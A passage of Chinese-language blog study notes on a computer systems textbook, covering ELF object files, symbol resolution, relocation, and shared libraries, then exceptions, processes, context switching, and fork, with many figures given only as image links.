目标文件</h3><p>目标文件三种形式：</p><ul><li><strong>可重定位目标文件</strong>。包含二进制代码和数据。其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行文件。</li><li><strong>可执行目标文件</strong>。包含二进制代码和数据。可被直接拷贝到存储器执行。</li><li><strong>共享目标文件</strong>。一种特殊的可重定位目标文件。可以在加载时或者在运行时被动态地加载到存储器并链接。</li></ul><p>编译器和汇编器生成可重定位目标文件（包括共享目标文件）。</p><p>链接器生成可执行目标文件。</p><hr><h3 id="7-4-可重定位目标文件"><a href="#7-4-可重定位目标文件" class="headerlink" title="7.4 可重定位目标文件"></a>7.4 可重定位目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614174042988.png" alt="image-20210614174042988"></p><ul><li><p><strong>ELF头</strong></p><ul><li><p>以一个<strong>16字节的序列</strong>开始，这个序列描述了<strong>生成该文件的系统的字的大小和字节顺序</strong>。</p></li><li><p>ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。</p><p>其中包括：</p><ul><li><p>ELF头的大小。</p></li><li><p>目标文件的类型（如可重定位、可执行或者是共享的）</p></li><li><p>机器类型（IA32）</p></li><li><p>节头部表的文件偏移</p></li><li><p>节头部表中的条目大小和数量。</p></li></ul></li></ul></li><li><p>夹在ELF头和节头部表之间的都是<strong>节</strong>。一个典型的ELF可重定位目标文件包含下面几个节：</p><ul><li><strong>.text：</strong>已编译程序的机器代码。</li><li><strong>.rodata：</strong>只读数据。比如printf语句中的格式串和switch语句的跳转表。</li><li><strong>.data：</strong>已初始化的全局C变量。局部C变量在运行时保存在栈中，既不出现在.data节中，也不出现在.bss节中。</li><li><strong>.bss：</strong>未初始化的全局C变量。在目标文件中，未初始化变量不需要占据任何实际的磁盘空间，仅仅是为了空间效率的占位符。</li><li><strong>.symtab：</strong>一个符号表，它存放在程序中定义和引用的函数和全局变量的信息。</li><li><strong>.rel.text：</strong>一个.text节中位置的列表，在与其他可重定位目标文件结合时需要修改这些位置。</li><li><strong>.rel.data：</strong>被模块引用或定义的任何全局变量的重定位信息。</li><li><strong>.debug：</strong>一个调试符号表。包括局部变量、全局变量以及原始的C源文件。只有用**<code>-g</code>选项**才会得到这张表。</li><li><strong>.line：</strong>原始C源程序中的行号和.text节中机器指令之间的映射。只有用**<code>-g</code>选项**才会得到这张表。</li><li><strong>.strtab：</strong>一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。</li></ul></li></ul><hr><h3 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h3><p><strong>链接器符号是什么？符号表又是什么？</strong></p><ul><li><strong>链接器符号</strong>其实就是程序中的变量名、函数名。</li><li><strong>符号表</strong>是编译器为存储变量名、函数名、对象、类、接口等各种实体的出现情况而创建和维护的一种重要的<strong>数据结构</strong>。</li></ul><p><strong>链接器符号分为三种：</strong></p><ul><li><strong>由本模块m定义并能被其他模块引用的全局符号</strong>。对应于非静态的的c函数以及被定义为不带c语言static属性的全局变量。</li><li><strong>由其他模块定义并被模块m引用的全局符号成为外部符号</strong>。对应于定义在其他模块中的c语 言函数和变量。</li><li><strong>仅由本模块m定义和引用的本地符号</strong>。对应于在模块中定义的带static的C语言函数和全局变量，这些函数和变量只能在本模块中引用，不能在其他模块中引用。</li><li><strong>注意：链接器的局部符号不是指程序中的局部变量（分配在栈中的临时性变量），链接器不关心这种局部变量。</strong></li></ul><p><strong>全局符号的强弱：</strong></p><ul><li>在编译时，<strong>编译器向汇编器输出</strong>的每个<strong>全局符号</strong>，或者是<strong>强符号</strong>，或者是<strong>弱符号</strong>。</li><li><strong>强符号</strong>：函数和已初始化的全局变量。</li><li><strong>弱符号</strong>：未初始化的全局变量。</li><li>对于<strong>多重定义的全局符号</strong>：强符号和弱符号中选强符号，强符号只能有一个，如果没有则选弱符号其中之一。</li><li>所以我们在<strong>编程时要注意</strong>尽可能地<strong>避免使用全局变量</strong>，若要使用需要合理使用<strong>static、extern</strong>，记得<strong>变量初始化</strong>。</li></ul><p><strong>.symtab节的中包含的ELF符号表举例：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210529134717830.png" alt="image-20210529134717830"></p><hr><h3 id="7-6-符号解析"><a href="#7-6-符号解析" class="headerlink" title="7.6 符号解析"></a>7.6 符号解析</h3><p><strong>链接器解析符号引用的方法：</strong>将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号联系起来。</p><h4 id="6-1-链接器如何解析多重定义的全局符号"><a href="#6-1-链接器如何解析多重定义的全局符号" class="headerlink" title="6.1 链接器如何解析多重定义的全局符号"></a>6.1 链接器如何解析多重定义的全局符号</h4><p><strong>按如下规则处理：</strong></p><p>规则1: 不允许有多个强符号。<br>规则2: 如果有一个强符号和多个弱符号，那么选择强符号。<br>规则3: 如果有多个弱符号，那么从这些弱符号中任意选择一个。</p><h4 id="6-2-与静态库链接"><a href="#6-2-与静态库链接" class="headerlink" title="6.2 与静态库链接"></a>6.2 与静态库链接</h4><p><strong>静态库：</strong>相关函数可以被编译为独立的目标模块，然后封装成一个单独的静态库文件。在链接时，链接器将只拷贝被程序引用的目标模块。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615150100376.png" alt="image-20210615150100376"></p><h4 id="6-3-链接器如何使用静态库来解析引用"><a href="#6-3-链接器如何使用静态库来解析引用" class="headerlink" title="6.3 链接器如何使用静态库来解析引用"></a>6.3 链接器如何使用静态库来解析引用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615151116120.png" alt="image-20210615151116120"></p><p>关于<strong>库的一般准则</strong>是将它们<strong>放在命令行的结尾</strong>。如果各个库的成员是相互独立的（也就是说没有成员引用另一个成员定义的符号），那么这些库就可以按照任何顺序放置在命令行的结尾处。<br>另一方面，如果库不是相互独立的，那么它们<strong>必须排序</strong>，使得对于每个被存档文件的成员外部引用的符号s,在命令行中至少有一个s的定义是在对s的引用之后的。</p><p>如果需要满足依赖需求，可以在<strong>命令行上重复库</strong></p><hr><h3 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h3><p>重定位将合并输入模块，并为每个符号分配运行时地址。</p><p>重定位由两步组成：</p><ul><li><strong>重定位节和符号定义。</strong>在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自输入模块的.data节被全部合并成一个节，这个节成为输出的可执行<br>目标文件的.data节。然后，链接器将运行时存储器地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每个指令和全局变量都有唯一的运行时存储器地址了。</li><li><strong>重定位节中的符号引用。</strong>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。为了执行这一步，链接器依赖于称为<strong>重定位条目</strong>( relocation entry)的可重定位目标模块中的数据结构</li></ul><h4 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615152035610.png" alt="image-20210615152035610"></p><p><strong>两种最基本的重定位类型：</strong></p><ul><li><p><strong>R_386_PC32：</strong>重定位一个使用32位PC相对地址的引用。</p><p>一个PC相对地址就是距程序计数器(PC)的当前运行时值的偏移量。当CPU执行一条使用PC相对寻址的指令时，它就将在指令中编码的32位值上加上PC的当前运行时值，得到有效地址(如ca11指令的目标)，PC值通常是存储器中下一条指令的地址。</p></li><li><p><strong>R_386_32：</strong>重定位一个使用32绝对地址的引用。</p><p>通过绝对寻址，CPU直接使用在指令中编码的32位值作为有效地址，不需要进一步修改。</p></li></ul><h4 id="7-7-2-重定位符号引用"><a href="#7-7-2-重定位符号引用" class="headerlink" title="7.7.2 重定位符号引用"></a>7.7.2 重定位符号引用</h4><p><strong>重定位算法</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615154815219.png" alt="image-20210615154815219"></p><p>ADDR(s)：每个节运行时地址</p><p>ADDR(r.symbol)：每个符号运行时地址</p><p><strong>1.重定位PC相对引用</strong></p><p>待重定位的代码</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155050140.png" alt="image-20210615155050140"></p><p>重定位条目</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155230646.png" alt="image-20210615155230646"></p><p>链接器已经确定</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155304801.png" alt="image-20210615155304801"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155314174-1623743596124.png" alt="image-20210615155314174"></p><p>首先计算出引用的运行时地址，即偏移量的实际起始地址</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155600812.png" alt="image-20210615155600812"></p><p>然后计算新的引用，即新的偏移量，从PC的当前值（当前指令的下一条指令起始地址）要偏移多少才会到swap的实际运行时地址</p><p>这个公式可以理解为引用的运行时地址加上引用所占据的字节数（bb+4)，然后用目标地址减去上面的值就是我们要得到的偏移量。</p><p>-4是由不同机器的引用长度决定的</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155705059.png" alt="image-20210615155705059"></p><p>于是指令被修改为</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155856359.png" alt="image-20210615155856359"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615155910631.png" alt="image-20210615155910631"></p><p><strong>2.重定位PC绝对引用</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615160238171.png" alt="image-20210615160238171"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615160318085.png" alt="image-20210615160318085"></p><hr><h3 id="7-8-可执行目标文件"><a href="#7-8-可执行目标文件" class="headerlink" title="7.8 可执行目标文件"></a>7.8 可执行目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161745659.png" alt="image-20210615161745659"></p><p>可执行文件p的段头部表</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161847318.png" alt="image-20210615161847318"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615161900425.png" alt="image-20210615161900425"></p><hr><h3 id="7-9-加载可执行目标文件"><a href="#7-9-加载可执行目标文件" class="headerlink" title="7.9 加载可执行目标文件"></a>7.9 加载可执行目标文件</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615162558215.png" alt="image-20210615162558215"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615162610066.png" alt="image-20210615162610066"></p><hr><h3 id="7-10-动态链接共享库"><a href="#7-10-动态链接共享库" class="headerlink" title="7.10 动态链接共享库"></a>7.10 动态链接共享库</h3><p>静态库存在如下缺点: </p><ul><li><p>在存储中的可执行文件中有多个副本 (每一个函数均需要静态库文件 ) </p></li><li><p>在运行中的可执行文件中存在多个副本 </p></li><li><p>即便是对系统库进行小bug的修复，也需要对使用到这个库的所有应用显示地重新链接</p></li></ul><p><strong>共享库</strong>( shared library)是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行时，可以加载到任意的存储器地址，并和一个在存储器中的程序链接起来。这个过程称为动态链接( dynamic linking),是由一个叫做动态链接器(dynamic linker)的程序来执行的。<br>共享库也称为共享目标( shared object),在Uniⅸ系统中通常用.so后缀来表示。微软的操作系统大量地利用了共享库，它们称为DLL（动态链接库）。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615164131444.png" alt="image-20210615164131444"></p><hr><h3 id="7-13-处理目标文件的工具"><a href="#7-13-处理目标文件的工具" class="headerlink" title="7.13 处理目标文件的工具"></a>7.13 处理目标文件的工具</h3><p>在Unix系统中有大量可用的工具可以帮助你理解和处理目标文件。特别地， GNU binutils包尤其有帮助，而且可以运行在每个Unⅸ平台上。</p><ul><li><strong>AR</strong>: 创建静态库，插入、删除、列出和提取成员。</li><li><strong>STRINGS</strong>: 列出一个目标文件中所有可打印的字符串。</li><li><strong>STRIP</strong>: 从目标文件中删除符号表信息。</li><li><strong>NM</strong>: 列出一个目标文件的符号表中定义的符号。</li><li><strong>SIZE</strong>: 列出目标文件中节的名字和大小</li><li><strong>READELF</strong>: 显示一个目标文件的完整结构，包括ELF头中编码的所有信息。包含SIZE和NM的功能</li><li><strong>OBJDUMP</strong>: 所有二进制工具之母。能够显示一个目标文件中所有的信息。它最大的作用是反汇编。text节中的二进制指今</li></ul><p>Unix系统为操作共亨库还提供了LDD程序：</p><ul><li><strong>LDD</strong>: 列出一个可执行文件在运行时所需要的共享库。</li></ul><hr><h2 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h2><h3 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h3><p><strong>异常</strong>就是控制流中的突变，用来响应处理器状态中的某些变化。</p><p>状态变化称为<strong>事件</strong>。事件可能和当前指令的执行直接相关。<br>比如，发生虚拟存储器缺页、算术溢出，或者一条指令试图除以零。另一方面，事件也可能和当前指令的执行没有关系。比如，一个系统定时器产生信号或者一个I/O请求完成。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615171511841.png" alt="image-20210615171511841"></p><p>在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做<strong>异常表</strong>(exception table)的跳转表，进行一个<strong>间接过程调用</strong>（异常)，到一个专门设计用来处理这类事件的操作系统子程序（<strong>异常处理程序</strong>( exception handler))</p><p>当异常处理程序完成处理后，根据引起异常的事件的类型，会发生以下三种情况中的一种：</p><ol><li>处理程序将控制返回给当前指令I<del>curr</del>，即当事件发生时正在执行的指令。</li><li>处理程序将控制返回给I<del>next</del>，即如果没有发生异常将会执行的下一条指令。</li><li>处理程序终止被中断的程序。</li></ol><h4 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h4><p>在系统启动时（当计算机重启或者加电时），操作系统分配和初始化一张称为<strong>异常表</strong>的跳转表，使得条目k包含异常k的处理程序的地址。图8-2展示了一张异常表的格式。</p><p>异常表的起始地址放在一个叫做<strong>异常表基址寄存器</strong>的特殊CPU寄存器中。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615171950006.png" alt="image-20210615171950006"></p><p><strong>异常</strong>类似于过程调用，但也有一些不同之处：</p><ul><li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中。然而，根据异常的类型，返回地址要么是当前指令（当事件发生时正在执行的指令），要么是下一条描指令（如果事件不发生，将会在当前指令后执行的指令）。</li><li>处理器也把一些额外的处理器状态压到栈里，在处理程序返回时，重新开始被中断的程序会需要这些状态。比如，一个IA32系统将包含当前条件码和其他内容的EFLAGS寄存器压人栈中。</li><li>如果控制从一个用户程序转移到内核，那么所有这些项目都被压到内核栈中，而不是压到用户栈中。</li><li>异常处理程序运行在内核模式下(见8.2.4节)，这意味着它们对所有的系统资源都有完全的访问权限。</li></ul><h4 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615172726725.png" alt="image-20210615172726725"></p><h5 id="1-中断"><a href="#1-中断" class="headerlink" title="1.中断"></a>1.中断</h5><p>中断是异步发生的，是来自处理器外部的I/O设备的信号的结果。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615172954970.png" alt="image-20210615172954970"></p><h5 id="2-陷阱和系统调用"><a href="#2-陷阱和系统调用" class="headerlink" title="2.陷阱和系统调用"></a>2.陷阱和系统调用</h5><p>陷阱是有意的异常，是执行一条指令的结果。</p><p>陷阱<strong>最重要的用途</strong>是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173310199.png" alt="image-20210615173310199"></p><p><strong>系统调用和普通的函数调用</strong>实现非常不同：</p><ul><li>普通的函数运行在用户模式(user mode)中，用户模式<br>限制了函数可以执行的指令的类型，而且它们只能访问与调用函数相同的栈。</li><li>系统调用运行在内核模式(kernel mode)中，内核模式允许系统调用执行指令，并访问定义在内核中的栈。</li></ul><h5 id="3-故障"><a href="#3-故障" class="headerlink" title="3.故障"></a>3.故障</h5><p>故障由错误情况引起，它可能能够被故障处理程序修正。当故障发生时，处理器将控制转移给故障处理程序。如果处理程序能够修正这个错误情况，它就将控制返回到引起故障的指令，从而重新执行它。否则，处理程序返回到内核中的 abort例程， abort例程会终止引起故障的应用程序。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173712103.png" alt="image-20210615173712103"></p><h5 id="4-终止"><a href="#4-终止" class="headerlink" title="4.终止"></a>4.终止</h5><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如DRAM或者SRAM位被损坏时发生的奇偶错误。终止处理程序从不将控制返回给应用程序。如图8-8所示，处理程序将控制返回给一个 abort例程，该例程会终止这个应用程序。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173835444.png" alt="image-20210615173835444"></p><h4 id="8-1-3-Linux-IA32系统中的异常"><a href="#8-1-3-Linux-IA32系统中的异常" class="headerlink" title="8.1.3 Linux/IA32系统中的异常"></a>8.1.3 Linux/IA32系统中的异常</h4><h5 id="1-Linux-IA32故障和终止"><a href="#1-Linux-IA32故障和终止" class="headerlink" title="1.Linux/IA32故障和终止"></a>1.Linux/IA32故障和终止</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615174044372.png" alt="image-20210615174044372"></p><h5 id="2-Linux-IA32系统调用"><a href="#2-Linux-IA32系统调用" class="headerlink" title="2.Linux/IA32系统调用"></a>2.Linux/IA32系统调用</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615174116950.png" alt="image-20210615174116950"></p><hr><h3 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h3><p><strong>进程</strong>的经典定义就是一个执行中的程序的实例。系统中的每个程序都是运行在某个进程的上下文( context)中的。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在存储器中的程序的代码和数据、它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。</p><p>进程提供给应用程序两个<strong>关键抽象</strong>：</p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占地使用处理器。</li><li>一个私有的地址空间，它提供一个假象，好像我们的程序独占地使用存储器系统。</li></ul><h4 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h4><p><strong>逻辑控制流</strong>提供一个假象，好像我们的程序在独占地使用处理器。如果想用调试器单步执行程序，我们会看到一系列的程序计数器(PC)的值，这些值唯一地对应于包含在程序的可执行目标文件中的指令，或者是包含在运行时动态链接到程序的共享对象中的指令。这个PC值的序列叫做<strong>逻辑控制流</strong>，或者简称逻辑流。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615190649412.png" alt="image-20210615190649412"></p><h4 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h4><p><strong>并发流</strong>：一个逻辑流的执行在时间上与另一个流重叠。更准确地说，流Ⅹ和Y互相并发，当且仅当X在Y开始之后和Y结束之前开始，或者Y在X开始之后和X结束之前开始。</p><p><strong>并发：</strong>多个流并发地执行的一般现象</p><p><strong>多任务：</strong>一个进程和其他进程轮流运行的概念</p><p><strong>时间片：</strong>一个进程执行它的控制流的一部分的每一时间叫做时间片，多任务也叫作时间分片。</p><p><strong>并行流：</strong>两个流并发的运行在不同的处理器核或者计算机上，它们并行地运行，且并行地执行</p><h4 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h4><p>进程也为每个程序提供一种假象，好像它独占地使用系统地址空间。</p><p>一个进程为每个程序提供它自己的私有地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读或者写的，从这个意义上说，这个地址空间是私有的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210622073331434.png" alt="image-20210622073331434"></p><h4 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h4><p>通过模式位来控制</p><p><strong>内核模式：</strong>设置了模式位后，一个运行在内核模式的进程可以执行指令集中的任何指令，并且可以访问系统中任何存储器位置。</p><p><strong>用户模式：</strong>没有设置模式位时，进程就运行在用户模式中。用户模式中的进程不允许执行特权指令(privileged instruction),比如停止处理器、改变模式位，或者发起一个IO操作。也不允许用户模式中的进程直接引用地址空间中内核区内的代码和数据。任何这样的尝试都会导致致命的保护故障。反之，用户程序必须通过系统调用接口间接地访问内核代码和数据。</p><h4 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h4><p>操作系统内核使用一种称为<strong>上下文切换</strong>的较高层形式的异常控制流来实现多任务。</p><p><strong>上下文</strong>就是内核重新启动一个被抢占的进程所需的状态。它由一些对象的值组成，这些对象包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构，比如描绘地址空间的页表、包含有关当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。<br>在进程执行的某些时刻，内核可以决定抢占当前进程，并重新开始一个先前被抢占的进程。这种决定就叫做<strong>调度</strong>( schedule),是由内核中称为<strong>调度器</strong>( scheduler)的代码处理的。当内核选择一个新的进程运行时，我们就说内核调度了这个进程。在内核调度了一个新的进程运行后，它就抢占当前进程，并使用一种称为上下文切换的机制来将控制转移到新的进程。</p><p><strong>上下文切换：</strong></p><ol><li><p>保存当前进程的上下文</p></li><li><p>恢复某个先前被抢占的进程被保存的上下文</p></li><li><p>将控制传递给这个新恢复的进程。</p></li></ol><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194036573.png" alt="image-20210615194036573"></p><hr><h3 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h3><p>当Unix系统级函数遇到错误时，它们典型地返回-1,并设置全局整数变量errno来表示什么出错了。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194451811.png" alt="image-20210615194451811"></p><p>简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194500771.png" alt="image-20210615194500771"></p><p>再简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194519890.png" alt="image-20210615194519890"></p><p>再简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194534416.png" alt="image-20210615194534416"></p><hr><h3 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h3><h4 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615200923542.png" alt="image-20210615200923542"></p><h4 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h4><p>从程序员的角度，我们可以认为进程总是处于下面三种状态之一：</p><ul><li><p><strong>运行</strong>。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p><strong>停止</strong>。进程的执行被挂起( suspend),且不会被调度。当收到 SIGSTOP、 SIGTSTP、SIDTTIN或者 SIGTTOU信号时，进程就停止，并且保持停止直到它收到一个 SIGCONT信号，在这个时刻，进程再次开始运行。</p></li><li><p><strong>终止</strong>。进程永远地停止了。进程会因为三种原因终止：</p><ol><li><p>收到一个信号，该信号的默认行为是终止进程，</p></li><li><p>从主程序返回</p></li><li><p>调用exit函数。</p></li></ol></li></ul><p><strong>子进程（fork函数如何创建）：</strong>新创建的子讲程几乎但不完全与父进程相同。子进程得到与父进程用户级虚拟地址空间相同的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间<strong>最大的区别</strong>在于它们有<strong>不同的PID</strong>。</p><p>示例程序：</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615201819338.png" alt="image-20210615201819338"></p><p><strong>fork函数的特点：</strong>调用一次，返回两次一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork返回子进程的<br>PID。在子进程中，fork返回0。因为子进程的PID总是非零的，返回值就提供一个明确的方法来分辨程序是在父进程还是在子进程中执行。</p><p><strong>这个例子（父子进程）的一些特点：</strong></p><ul><li><p><strong>调用一次，返回两次。</strong>fork函数被父进程调用一次，但是却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p></li><li><p><strong>并发执行。</strong>父进程和子进程是并发运行的独立进程。内核能够以任意方式交替执行它们的逻辑控制流中的指令。当我们在系统上运行这个程序时，父进程先完成它的 printf语句，然后是子进程。然而，在另一个系统上可能正好相反。一般而言，作为程序员，我们决不能对不同进程中指令的交替执行做任何假设。</p></li><li><p><strong>相同的但是独立的地址空间。</strong>如果能够在fork函数在父进程和子进程中返回后立即暂停这两个进程，我们会看到每个进程的地址空间都是相同的。每个进程有相同的用户栈、相同的本地变量值、相同的堆、相同的全局变量值，以及相同的代码。</p><p>因此，在我们的示例程序中，当fork函数在第8行返回时，本地变量x在父进程和子进程中都为1。然而因为父进程和子进程是独立的进程，它们都有自己的私有地址空间。父进程和子进程对所做的任何改变都是独立的，不会反映在另一个进程的存储器中。这就是为什么当父进程和子进程调用它们各自的 printf语句时，它们中的变量x会有不同的值的原因。</p></li><li><p><strong>共享文件。</strong>当运行这个示例程序时，我们注意到父进程和子进程都把它们的输出显示在屏幕上。原因是子进程继承了父进程所有的打开文件。当父进程调用fork时， 